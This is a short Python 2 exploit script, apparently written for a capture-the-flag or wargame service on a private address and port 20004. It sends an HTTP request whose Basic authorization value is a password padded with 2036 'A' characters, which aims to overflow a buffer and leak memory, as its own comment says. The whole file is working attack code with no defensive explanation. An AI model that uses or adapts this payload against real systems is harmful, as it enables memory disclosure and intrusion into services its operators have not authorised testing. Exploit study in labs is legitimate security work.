#!/usr/bin/env python
import socket
import base64
import time
import string
import random

# info leak with the proper secret replaced

TCP_IP = '10.0.0.1'
TCP_PORT = 20004
BUFFER_SIZE = 1024

def create_http_request(uri, password):
	request = "GET "+uri+" HTTP/1.0\nAuthorization: Basic "+base64.b64encode(password)+"\n\n"
	return request

password = "PC1fysF7wbnh8vU0" + "A"*2036
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
httprequest = create_http_request("/./", password)
s.send(httprequest)
while True:
	data = s.recv(BUFFER_SIZE)
	if not data:
		break
	print data
s.close()

